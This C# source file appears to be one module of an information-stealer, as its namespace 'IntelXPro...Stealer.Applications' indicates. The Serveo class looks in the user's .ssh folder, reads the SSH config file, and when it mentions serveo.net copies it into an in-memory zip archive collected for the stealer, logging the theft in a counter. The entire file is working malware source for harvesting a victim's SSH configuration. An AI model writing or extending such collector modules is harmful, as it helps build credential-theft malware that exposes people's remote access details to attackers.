using IntelXPro.src.IntelXPro.Dependencies.Data;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace IntelXPro.src.IntelXPro.Stealer.Applications
{
    internal class Serveo : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            string userProfilePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), ".ssh");

            Counter.CounterApplications counterApplications = new Counter.CounterApplications();
            counterApplications.Name = "Serveo";

            bool foundData = false;

            if (Directory.Exists(userProfilePath))
            {
                try
                {
                    string configFile = Path.Combine(userProfilePath, "config");
                    if (File.Exists(configFile))
                    {
                        string content = File.ReadAllText(configFile);
                        if (content.Contains("serveo.net"))
                        {
                            string zipPath = "Applications\\Serveo\\ssh_config";
                            zip.AddFile(zipPath, File.ReadAllBytes(configFile));
                            counterApplications.Files.Add(configFile + " => " + zipPath);
                            foundData = true;
                        }
                    }
                }
                catch
                {
                }
            }

            if (foundData && counterApplications.Files.Count > 0)
            {
                counter.Applications.Add(counterApplications);
            }
        }
    }
}
